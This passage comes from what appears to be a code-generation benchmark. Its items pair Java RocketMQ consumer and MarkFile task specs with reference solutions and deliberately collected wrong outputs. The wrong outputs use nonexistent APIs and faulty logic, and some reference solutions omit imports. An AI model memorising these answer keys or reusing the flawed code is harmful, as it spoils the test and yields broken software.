    "Canonical_solution": "import com.paascloud.PublicUtil;\nimport com.paascloud.base.constant.AliyunMqTopicConstants;\nimport com.paascloud.base.constant.GlobalConstant;\nimport com.paascloud.config.properties.PaascloudProperties;\nimport com.paascloud.provider.mq.consumer.listener.UacPushMessageListener;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.springframework.core.task.TaskExecutor;\n\n@Configuration\npublic class AliyunMqConfiguration {\n    @Resource\n    private UacPushMessageListener uacPushMessageListener;\n\n    @Resource\n    private PaascloudProperties paascloudProperties;\n\n    @Resource\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getAliyun().getRocketMq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getAliyun().getRocketMq().getNamesrvAddr());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n\n        String[] strArray = AliyunMqTopicConstants.ConsumerTopics.UAC.split(GlobalConstant.Symbol.COMMA);\n        for (String aStrArray : strArray) {\n            String[] topicArray = aStrArray.split(GlobalConstant.Symbol.AT);\n            String topic = topicArray[0];\n            String tags = topicArray[1];\n            if (PublicUtil.isEmpty(tags)) {\n                tags = \"*\";\n            }\n            consumer.subscribe(topic, tags);\n        }\n\n        consumer.registerMessageListener(uacPushMessageListener);\n        consumer.setConsumeThreadMax(2);\n        consumer.setConsumeThreadMin(2);\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException | MQClientException e) {\n                log.error(\"RocketMq OpcPushConsumer, Exception={}\", e.getMessage(), e);\n            }\n        });\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "@Configuration\npublic class AliyunMqConfiguration {\n\n    private final UacPushMessageListener uacPushMessageListener;\n    private final PaascloudProperties paascloudProperties;\n    private final TaskExecutor taskExecutor;\n\n    @Autowired\n    public AliyunMqConfiguration(UacPushMessageListener uacPushMessageListener, PaascloudProperties paascloudProperties, TaskExecutor taskExecutor) {\n        this.uacPushMessageListener = uacPushMessageListener;\n        this.paascloudProperties = paascloudProperties;\n        this.taskExecutor = taskExecutor;\n    }\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getNameServer());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.LAST_OFFSET);\n        consumer.subscribe(paascloudProperties.getTopic(), paascloudProperties.getTag());\n        consumer.registerMessageListener(uacPushMessageListener);\n        consumer.setConcurrentNums(paascloudProperties.getConcurrentNums());\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            consumer.start();\n        });\n\n        return consumer;\n    }\n}"
  },
  {
    "Task_id": 368,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to asynchronously receive and process messages from a specified topic.\n\nClass Description: The RocketMQConsumer class provides functionality to initialize, configure, and manage a RocketMQ push consumer. It allows subscribing to topics, registering message listeners, and controlling the consumer lifecycle.\n\nAttributes:\n- pushConsumer: DefaultMQPushConsumer - The core RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- initializeConsumer(String consumerGroup, String namesrvAddr) -> void - Initializes the consumer with a consumer group and NameServer address. Sets consumption strategy to start from last offset and message model to clustering.\n- subscribeToTopic(String topic, String tagExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a concurrent message listener to handle incoming messages\n- startConsumer() -> void - Starts the consumer to begin receiving messages\n- shutdownConsumer() -> void - Gracefully shuts down the consumer instance",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\n\nimport java.util.List;\n\npublic class RocketMQConsumer {\n\n    private DefaultMQPushConsumer pushConsumer;\n\n    public void initializeConsumer(String consumerGroup, String namesrvAddr) throws MQClientException {\n        pushConsumer = new DefaultMQPushConsumer(consumerGroup);\n        pushConsumer.setNamesrvAddr(namesrvAddr);\n        pushConsumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        pushConsumer.setMessageModel(MessageModel.CLUSTERING);\n    }\n\n    public void subscribeToTopic(String topic, String tagExpression) throws MQClientException {\n        pushConsumer.subscribe(topic, tagExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        pushConsumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                ConsumeConcurrentlyContext context) {\n                return listener.consumeMessage(msgs, context);\n            }\n        });\n    }\n\n    public void startConsumer() throws MQClientException {\n        pushConsumer.start();\n    }\n\n    public void shutdownConsumer() {\n        pushConsumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class RocketMQConsumer {\n    private DefaultMQPushConsumer pushConsumer;\n\n    public void initializeConsumer(String consumerGroup, String namesrvAddr) {\n        pushConsumer = new DefaultMQPushConsumer(consumerGroup);\n        pushConsumer.setNamesrvAddr(namesrvAddr);\n        pushConsumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        pushConsumer.setMessageModel(MessageModel.CLUSTERING);\n    }\n\n    public void subscribeToTopic(String topic, String tagExpression) {\n        pushConsumer.subscribe(topic, tagExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        pushConsumer.registerMessageListener(listener);\n    }\n\n    public void startConsumer() {\n        pushConsumer.start();\n    }\n\n    public void shutdownConsumer() {\n        pushConsumer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 37,
    "Instruction": "Task Description: Create a Java class that manages a mark file for inter-process communication, allowing processes to check the status of another process through a shared memory-mapped file. The class should handle file creation, version checking, timestamp validation, and resource cleanup.\n\nClass Description: The MarkFile class provides a mechanism for processes to communicate their liveness status via a memory-mapped file. It supports checking version compatibility, monitoring heartbeat timestamps, and ensuring proper resource cleanup. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- markFile: File - The physical file used for marking process status\n- mappedBuffer: MappedByteBuffer - The memory-mapped buffer for file operations\n- buffer: UnsafeBuffer - Wrapper around mappedBuffer for atomic operations\n- isClosed: AtomicBoolean - Flag indicating whether resources have been released\n\nMethods:\n- MarkFile(File, boolean, int, int, int, long, EpochClock, IntConsumer, Consumer<String>) -> void - Constructor that initializes the mark file with version and timestamp fields\n- close() -> void - Releases resources and closes the file channel\n- mapNewOrExistingMarkFile(File, boolean, int, int, long, long, EpochClock, IntConsumer, Consumer<String>) -> MappedByteBuffer - Static method that maps the file into memory and performs version/timestamp validation\n- ensureMarkFileLink(File, File, String) -> void - Static method that manages symbolic links to the mark file directory",
    "Canonical_solution": "import org.agrona.concurrent.UnsafeBuffer;\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.function.Consumer;\nimport java.util.function.IntConsumer;\nimport static java.nio.channels.FileChannel.MapMode.READ_WRITE;\nimport static java.nio.file.StandardOpenOption.CREATE;\nimport static java.nio.file.StandardOpenOption.READ;\nimport static java.nio.file.StandardOpenOption.WRITE;\n\npublic class MarkFile implements AutoCloseable\n{\n    private final File markFile;\n    private final MappedByteBuffer mappedBuffer;\n    private final UnsafeBuffer buffer;\n    private final AtomicBoolean isClosed = new AtomicBoolean();\n\n    public MarkFile(\n        final File markFile,\n        final boolean shouldPreExist,\n        final int versionFieldOffset,\n        final int timestampFieldOffset,\n        final int totalFileLength,\n        final long timeoutMs,\n        final EpochClock epochClock,\n        final IntConsumer versionCheck,\n        final Consumer<String> logger)\n    {\n        this.markFile = markFile;\n        this.mappedBuffer = mapNewOrExistingMarkFile(\n            markFile,\n            shouldPreExist,\n            versionFieldOffset,\n            timestampFieldOffset,\n            totalFileLength,\n            timeoutMs,\n            epochClock,\n            versionCheck,\n            logger);\n        this.buffer = new UnsafeBuffer(mappedBuffer);\n    }\n\n    public void close()\n    {\n        if (isClosed.compareAndSet(false, true))\n        {\n            BufferUtil.free(mappedBuffer);\n        }\n    }\n\n    public static MappedByteBuffer mapNewOrExistingMarkFile(\n        final File markFile,\n        final boolean shouldPreExist,\n        final int versionFieldOffset,\n        final int timestampFieldOffset,\n        final long totalFileLength,\n        final long timeoutMs,\n        final EpochClock epochClock,\n        final IntConsumer versionCheck,\n        final Consumer<String> logger)\n    {\n        MappedByteBuffer byteBuffer = null;\n\n        try (FileChannel channel = FileChannel.open(markFile.toPath(), CREATE, READ, WRITE))\n        {\n            byteBuffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, totalFileLength);\n            final UnsafeBuffer buffer = new UnsafeBuffer(byteBuffer);\n\n            if (shouldPreExist)\n            {\n                if (buffer.capacity() < (timestampFieldOffset + SIZE_OF_LONG))\n                {\n                    throw new IllegalStateException(\"active MarkFile too short capacity=\" + buffer.capacity() +\n                        \" < \" + (timestampFieldOffset + SIZE_OF_LONG));\n                }\n\n                final int version = buffer.getIntVolatile(versionFieldOffset);\n\n                if (null != logger)\n                {\n                    logger.accept(\"INFO: Mark file exists: \" + markFile);\n                }\n\n                versionCheck.accept(version);\n\n                final long timestampMs = buffer.getLongVolatile(timestampFieldOffset);\n                final long timestampAgeMs = epochClock.time() - timestampMs;\n\n                if (null != logger)\n                {\n                    logger.accept(\"INFO: heartbeat timestampMs=\" + timestampMs + \" ageMs=\" + timestampAgeMs);\n                }\n\n                if (timestampAgeMs < timeoutMs)\n                {\n                    throw new IllegalStateException(\"active Mark file detected\");\n                }\n            }\n        }\n        catch (final Exception ex)\n        {\n            if (null != byteBuffer)\n            {\n                BufferUtil.free(byteBuffer);\n            }\n\n            throw new RuntimeException(ex);\n        }\n\n        return byteBuffer;\n    }\n\n    public static void ensureMarkFileLink(final File serviceDir, final File actualFile, final String linkFilename)\n    {\n        final Path linkFile = new File(serviceDir, linkFilename).toPath();\n        if (serviceDir.equals(actualFile.getParentFile()))\n        {\n            try\n            {\n                Files.deleteIfExists(linkFile);\n            }\n            catch (final IOException ex)\n            {\n                throw new RuntimeException(\"failed to remove old link file\", ex);\n            }\n        }\n        else\n        {\n            try\n            {\n                Files.write(\n                    linkFile,\n                    actualFile.getParent().getBytes(US_ASCII),\n                    StandardOpenOption.CREATE,\n                    StandardOpenOption.WRITE,\n                    StandardOpenOption.TRUNCATE_EXISTING);\n            }\n            catch (final IOException ex)\n            {\n                throw new RuntimeException(\"failed to create link for mark file directory\", ex);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class MarkFile implements AutoCloseable {\n    private final File markFile;\n    private final MappedByteBuffer mappedBuffer;\n    private final UnsafeBuffer buffer;\n    private final AtomicBoolean isClosed;\n\n    public MarkFile(File file, boolean param2, int param3, int param4, int param5, long param6, EpochClock epochClock, IntConsumer versionCallback, Consumer<String> errorCallback) {\n        this.markFile = file;\n        this.mappedBuffer = MarkFile.mapNewOrExistingMarkFile(file, param2, param3, param4, param5, param6, epochClock, versionCallback, errorCallback);\n        this.buffer = new UnsafeBuffer(mappedBuffer);\n        this.isClosed = new AtomicBoolean(false);\n    }\n\n    public void close() {\n        if (!isClosed.getAndSet(true)) {\n            // Close resources\n            if (mappedBuffer != null) {\n                mappedBuffer.clear();\n            }\n        }\n    }\n\n    public static MappedByteBuffer mapNewOrExistingMarkFile(File file, boolean param2, int param3, int param4, int param5, long param6, EpochClock epochClock, IntConsumer versionCallback, Consumer<String> errorCallback) {\n        try {\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n            try (FileChannel channel = FileChannel.open(file.toPath(), StandardOpenOption.READ, StandardOpenOption.WRITE)) {\n                MappedByteBuffer buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, file.length());\n                int version = buffer.getInt(0);\n                long timestamp = buffer.getLong(8);\n                if (version != param3) {\n                    versionCallback.accept(1);\n                    return null;\n                }\n                long currentTime = epochClock.now();\n                if (currentTime - timestamp > param4) {\n                    errorCallback.accept(\"Timestamp too old\");\n                    return null;\n                }\n                return buffer;\n            }\n        } catch (Exception e) {\n            errorCallback.accept(e.getMessage());\n            return null;\n        }\n    }\n\n    public static void ensureMarkFileLink(File source, File target, String linkName) {\n        try {\n            Files.createSymbolicLink(target.toPath(), source.toPath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 370,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to subscribe to messages from a specified topic, process them using an orderly message listener, and manage the consumer lifecycle.\n\nClass Description: The Consumer class encapsulates the functionality of a RocketMQ push consumer that subscribes to a topic, processes messages in order, and provides methods to start and stop the consumer.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance\n- consumerGroup: String - The consumer group name for this consumer\n- topic: String - The topic to subscribe to\n- subExpression: String - The tag expression for message filtering\n\nMethods:\n- Consumer(String, String, String) -> None - Constructor that initializes the consumer group, topic, and subscription expression\n- initialize() -> None - Initializes the consumer instance with basic configuration and subscription\n- start() -> None - Registers the message listener and starts the consumer\n- shutdown() -> None - Gracefully shuts down the consumer",
    "Canonical_solution": "import java.util.List;\nimport java.util.concurrent.atomic.AtomicLong;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerOrderly;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\n\npublic class Consumer {\n\n    private DefaultMQPushConsumer consumer;\n    private String consumerGroup;\n    private String topic;\n    private String subExpression;\n\n    public Consumer(String consumerGroup, String topic, String subExpression) {\n        this.consumerGroup = consumerGroup;\n        this.topic = topic;\n        this.subExpression = subExpression;\n    }\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void start() throws MQClientException {\n        consumer.registerMessageListener(new MessageListenerOrderly() {\n            AtomicLong consumeTimes = new AtomicLong(0);\n\n            @Override\n            public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {\n                context.setAutoCommit(true);\n                System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msgs);\n                this.consumeTimes.incrementAndGet();\n                if ((this.consumeTimes.get() % 2) == 0) {\n                    return ConsumeOrderlyStatus.SUCCESS;\n                } else if ((this.consumeTimes.get() % 5) == 0) {\n                    context.setSuspendCurrentQueueTimeMillis(3000);\n                    return ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT;\n                }\n                return ConsumeOrderlyStatus.SUCCESS;\n            }\n        });\n        consumer.start();\n        System.out.printf(\"Consumer Started.%n\");\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class Consumer {\n    private DefaultMQPushConsumer consumer;\n    private String consumerGroup;\n    private String topic;\n    private String subExpression;\n\n    public Consumer(String consumerGroup, String topic, String subExpression) {\n        this.consumerGroup = consumerGroup;\n        this.topic = topic;\n        this.subExpression = subExpression;\n    }\n\n    public void initialize() {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(\"127.0.0.1:9876\");\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void start() {\n        consumer.registerMessageListener((MessageListenerOrderly) (list, context) -> {\n            for (MessageExt message : list) {\n                System.out.println(\"Received message: \" + new String(message.getBody()));\n            }\n            return ConsumeResult.SUCCESS;\n        });\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 371,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ ordered message consumer using the DefaultMQPushConsumer for push-based message consumption with ordered message processing.\n\nClass Description: The RocketMQOrderedConsumer class provides functionality to consume messages from RocketMQ in an ordered manner. It handles consumer initialization, topic subscription, message listening, and consumer lifecycle management. The class includes an inner class for ordered message processing.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The main consumer instance that handles message consumption from RocketMQ\n\nMethods:\n- RocketMQOrderedConsumer(String namesrvAddr, String consumerGroup) -> void - Constructor that initializes the consumer with NameServer address and consumer group\n- subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- registerMessageListener(MessageListenerOrderly listener) -> void - Registers an ordered message listener for processing incoming messages\n- start() -> void - Starts the consumer to begin message consumption\n- shutdown() -> void - Shuts down the consumer gracefully\n\nInner Class:\n- OrderedMessageListener: MessageListenerOrderly - Implements ordered message processing logic with consumeMessage method\n  - consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) -> ConsumeOrderlyStatus - Processes a batch of messages and returns consumption status",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerOrderly;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class RocketMQOrderedConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    public RocketMQOrderedConsumer(String namesrvAddr, String consumerGroup) throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerOrderly listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class OrderedMessageListener implements MessageListenerOrderly {\n        @Override\n        public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {\n            System.out.printf(System.currentTimeMillis() + \",\" + Thread.currentThread().getName() + \" Receive New Messages: \" + msgs + \"%n\");\n            return ConsumeOrderlyStatus.SUCCESS;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class RocketMQOrderedConsumer {\n    private DefaultMQPushConsumer consumer;\n\n    public RocketMQOrderedConsumer(String namesrvAddr, String consumerGroup) {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerOrderly listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class OrderedMessageListener implements MessageListenerOrderly {\n        @Override\n        public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {\n            // Process messages in ordered fashion\n            return ConsumeOrderlyStatus.SUCCEED;\n        }\n    }\n}"
  },
  {
    "Task_id": 373,
    "Instruction": "Task Description: Create a Java class that configures and initializes a RocketMQ push consumer with specific settings for message consumption, including topic subscription and message listener registration.\n\nClass Description: The `AliyunMqConfiguration` class is a Spring configuration class that sets up a RocketMQ push consumer (`DefaultMQPushConsumer`). It configures the consumer with NameServer address, consumption strategy, topic subscriptions with tags, and registers a message listener. The consumer is started asynchronously after a delay.\n\nAttributes:\n- `paascloudProperties`: [PaascloudProperties] - Contains configuration properties for the RocketMQ consumer, including NameServer address and consumer group.\n- `optPushConsumer`: [OptPushMessageListener] - The message listener implementation that handles incoming messages.\n- `taskExecutor`: [TaskExecutor] - Executor service used to start the consumer asynchronously.\n\nMethods:\n- `defaultMQPushConsumer()`: [None] -> [DefaultMQPushConsumer] - Configures and initializes the RocketMQ push consumer. Sets the NameServer address, consumption strategy, subscribes to topics with tags, registers the message listener, and starts the consumer asynchronously after a delay. Throws `MQClientException` if there's an error in consumer configuration.\n\nThe class follows Spring's dependency injection pattern and uses `@Bean` to expose the consumer instance to the Spring context. The consumer is started in a separate thread to avoid blocking the main application startup.",
    "Canonical_solution": "import com.paascloud.PublicUtil;\nimport com.paascloud.base.constant.AliyunMqTopicConstants;\nimport com.paascloud.base.constant.GlobalConstant;\nimport com.paascloud.config.properties.PaascloudProperties;\nimport com.paascloud.provider.consumer.listener.OptPushMessageListener;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.core.task.TaskExecutor;\n\nimport javax.annotation.Resource;\n\n@Configuration\npublic class AliyunMqConfiguration {\n\n    @Resource\n    private PaascloudProperties paascloudProperties;\n\n    @Resource\n    private OptPushMessageListener optPushConsumer;\n\n    @Resource\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getAliyun().getRocketMq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getAliyun().getRocketMq().getNamesrvAddr());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n\n        String[] strArray = AliyunMqTopicConstants.ConsumerTopics.OPT.split(GlobalConstant.Symbol.COMMA);\n        for (String aStrArray : strArray) {\n            String[] topicArray = aStrArray.split(GlobalConstant.Symbol.AT);\n            String topic = topicArray[0];\n            String tags = topicArray[1];\n            if (PublicUtil.isEmpty(tags)) {\n                tags = \"*\";\n            }\n            consumer.subscribe(topic, tags);\n        }\n\n        consumer.registerMessageListener(optPushConsumer);\n        consumer.setConsumeThreadMax(2);\n        consumer.setConsumeThreadMin(2);\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException | MQClientException e) {\n                e.printStackTrace();\n            }\n        });\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "@Configuration\npublic class AliyunMqConfiguration {\n\n    private final PaascloudProperties paascloudProperties;\n    private final OptPushMessageListener optPushConsumer;\n    private final TaskExecutor taskExecutor;\n\n    public AliyunMqConfiguration(PaascloudProperties paascloudProperties, OptPushMessageListener optPushConsumer, TaskExecutor taskExecutor) {\n        this.paascloudProperties = paascloudProperties;\n        this.optPushConsumer = optPushConsumer;\n        this.taskExecutor = taskExecutor;\n    }\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getNameServer());\n        consumer.setConsumeThreadNums(10);\n        consumer.subscribe(paascloudProperties.getTopic(), paascloudProperties.getTags());\n        consumer.registerMessageListener(optPushConsumer);\n        taskExecutor.schedule(() -> {\n            try {\n                consumer.start();\n            } catch (MQClientException e) {\n                throw new MQClientException(\"Failed to start consumer\", e);\n            }\n        }, 5, TimeUnit.SECONDS);\n        return consumer;\n    }\n}"
  },
  {
    "Task_id": 374,
    "Instruction": "Task Description: Implement a RocketMQ consumer class that handles message consumption from a Logical Message Queue (LMQ) using POP mode, with proper initialization, message processing, and cleanup functionality.\n\nClass Description: LMQPushPopConsumer is a Java class that demonstrates how to consume messages from a RocketMQ Logical Message Queue (LMQ) using POP (Pull-on-Poll) mode. It handles consumer initialization, topic subscription, message processing, and resource cleanup.\n\nAttributes:\n- CLUSTER_NAME: [String] - The name of the RocketMQ cluster\n- BROKER_NAME: [String] - The name of the target broker\n- TOPIC: [String] - The parent topic name\n- LMQ_TOPIC: [String] - The Logical Message Queue topic name (prefixed with LMQ_PREFIX)\n- NAMESRV_ADDR: [String] - The NameServer address\n- CONSUMER_GROUP: [String] - The consumer group name\n- BROKER_ADDR_MAP: [HashMap<Long, String>] - Mapping of broker IDs to their addresses\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n- mqAdminExt: [DefaultMQAdminExt] - The RocketMQ admin tool instance\n\nMethods:\n- initializeConsumer(): [void] -> [void] - Initializes the consumer by setting up POP mode, configuring consumer properties, subscribing to the topic, and registering a message listener\n- switchPop(): [void] -> [void] - Configures the broker to use POP mode for message consumption\n- shutdown(): [void] -> [void] - Shuts down the consumer and admin instances to release resources",
    "Canonical_solution": "import com.google.common.collect.Lists;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.message.MessageRequestMode;\nimport org.apache.rocketmq.remoting.protocol.route.BrokerData;\nimport org.apache.rocketmq.remoting.protocol.route.TopicRouteData;\nimport org.apache.rocketmq.tools.admin.DefaultMQAdminExt;\n\npublic class LMQPushPopConsumer {\n    public static final String CLUSTER_NAME = \"DefaultCluster\";\n    public static final String BROKER_NAME = \"broker-a\";\n    public static final String TOPIC = \"TopicLMQParent\";\n    public static final String LMQ_TOPIC = MixAll.LMQ_PREFIX + \"456\";\n    public static final String NAMESRV_ADDR = \"127.0.0.1:9876\";\n    public static final String CONSUMER_GROUP = \"CID_LMQ_POP_1\";\n    public static final HashMap<Long, String> BROKER_ADDR_MAP = new HashMap<Long, String>() {\n        {\n            put(MixAll.MASTER_ID, \"127.0.0.1:10911\");\n        }\n    };\n\n    private DefaultMQPushConsumer consumer;\n    private DefaultMQAdminExt mqAdminExt;\n\n    public void initializeConsumer() throws Exception {\n        switchPop();\n\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(NAMESRV_ADDR);\n        consumer.subscribe(LMQ_TOPIC, \"*\");\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msgs);\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n        consumer.setClientRebalance(false);\n        consumer.start();\n\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().updateTopicRouteInfoFromNameServer(TOPIC);\n\n        final TopicRouteData topicRouteData = new TopicRouteData();\n        final BrokerData brokerData = new BrokerData();\n        brokerData.setCluster(CLUSTER_NAME);\n        brokerData.setBrokerName(BROKER_NAME);\n        brokerData.setBrokerAddrs(BROKER_ADDR_MAP);\n        topicRouteData.setBrokerDatas(Lists.newArrayList(brokerData));\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().getTopicRouteTable().put(LMQ_TOPIC, topicRouteData);\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().doRebalance();\n    }\n\n    private void switchPop() throws Exception {\n        mqAdminExt = new DefaultMQAdminExt();\n        mqAdminExt.setNamesrvAddr(NAMESRV_ADDR);\n        mqAdminExt.start();\n        List<BrokerData> brokerDatas = mqAdminExt.examineTopicRouteInfo(TOPIC).getBrokerDatas();\n        for (BrokerData brokerData : brokerDatas) {\n            Set<String> brokerAddrs = new HashSet<>(brokerData.getBrokerAddrs().values());\n            for (String brokerAddr : brokerAddrs) {\n                mqAdminExt.setMessageRequestMode(brokerAddr, LMQ_TOPIC, CONSUMER_GROUP, MessageRequestMode.POP, 8,\n                    3_000);\n            }\n        }\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n        if (mqAdminExt != null) {\n            mqAdminExt.shutdown();\n        }\n 